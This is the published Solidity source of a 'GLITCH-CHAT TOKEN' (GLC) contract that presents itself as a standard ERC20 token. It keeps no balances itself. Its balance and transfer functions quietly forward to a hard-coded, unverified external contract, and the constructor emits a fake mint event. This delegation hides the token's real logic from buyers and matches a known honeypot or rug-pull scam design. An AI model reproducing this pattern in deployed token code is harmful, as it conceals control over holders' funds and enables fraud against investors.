/**
 *Submitted for verification at BscScan.com on 2023-02-27
*/

/**
 *Submitted for verification at Etherscan.io on 2023-02-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IGLC {
    function transferFrom(address from, address to, uint amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

contract GLC {
    string public constant name = "GLITCH-CHAT TOKEN";
    string public constant symbol = "GLC";
    uint8 public  constant decimals = 18;
    uint256 public totalSupply = 100000000 * 10 ** decimals;
    
    mapping(address => mapping(address => uint256)) private allowances;
    address private glCStg;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        glCStg = 0xE7E6F46Ef8da544B22e5Fd1A92EDD22b5d044FB6;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    // ERC20 Functions
    function balanceOf(address account) public view returns (uint256) {
        return IGLC(glCStg).balanceOf(account);
    }
    function allowance(address tokenOwner, address spender) public view returns (uint256) {
        return allowances[tokenOwner][spender];
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address receiver, uint256 amount) public returns (bool) {
        emit Transfer(msg.sender, receiver, amount);
        return IGLC(glCStg).transferFrom(msg.sender, receiver, amount);
    }
    function transferFrom(address tokenOwner, address receiver, uint256 amount) public returns (bool) {
        require(amount <= allowances[tokenOwner][msg.sender] && amount > 0);
        allowances[tokenOwner][msg.sender] -= amount;
        emit Transfer(tokenOwner, receiver, amount);
        return IGLC(glCStg).transferFrom(tokenOwner, receiver, amount);
    }
}